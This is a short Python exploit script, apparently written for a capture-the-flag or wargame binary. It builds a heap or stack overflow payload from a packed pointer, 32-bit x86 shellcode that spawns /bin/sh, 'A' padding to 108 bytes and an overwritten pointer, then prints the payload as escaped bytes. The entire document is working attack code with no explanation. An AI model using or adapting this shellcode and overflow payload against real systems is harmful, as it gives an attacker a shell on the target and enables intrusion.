#!/usr/bin/env python3

from struct import pack

def isprint(c): return c >= 0x20 and c <= 0x7e
def p(x): return pack('<I', x)

payload = p(0x804a008+0x8)
payload += b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
payload += b"A" * (108 - len(payload))
payload += p(0x804a008+0x4) # n1->buffer + 0x4

for c in payload:
    if isprint(c): print(chr(c), end='')
    else: print("\\x%02x" % c, end='')
